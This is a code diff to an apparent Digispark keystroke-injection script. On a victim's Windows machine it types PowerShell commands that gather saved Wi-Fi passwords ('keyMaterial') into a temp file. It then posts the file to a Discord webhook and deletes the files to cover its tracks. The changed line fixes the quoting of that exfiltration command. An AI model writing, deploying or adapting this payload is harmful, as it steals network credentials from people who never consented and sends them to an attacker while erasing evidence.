@@ -23,7 +23,7 @@ void loop() {
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); //Extracting all password and saving them in Wi-Fi-Pass.txt file in temporary dir
   DigiKeyboard.delay(500);  
-  DigiKeyboard.println("powershell -c "$content = [System.IO.File]::ReadAllText('%temp%\Wi-Fi-PASS.txt').Trim(); $body = @{content = [string]$content} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/YOUR-DISCORD-WEBHOOK-HERE' -Method Post -Body $body -ContentType 'application/json' -Headers @{'Content-Type'='application/json; charset=utf-8'}""); //Submitting all passwords on Discord
+  DigiKeyboard.println("powershell -c '$content = [System.IO.File]::ReadAllText(\"%temp%\\Wi-Fi-PASS.txt\").Trim(); $body = @{content = [string]$content} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri \"https://discordapp.com/api/webhooks/YOUR-DISCORD-WEBHOOK-HERE\" -Method Post -Body $body -ContentType \"application/json\" -Headers @{\"Content-Type\"=\"application/json; charset=utf-8\"}'");
   DigiKeyboard.delay(1000);  
   DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(500);  
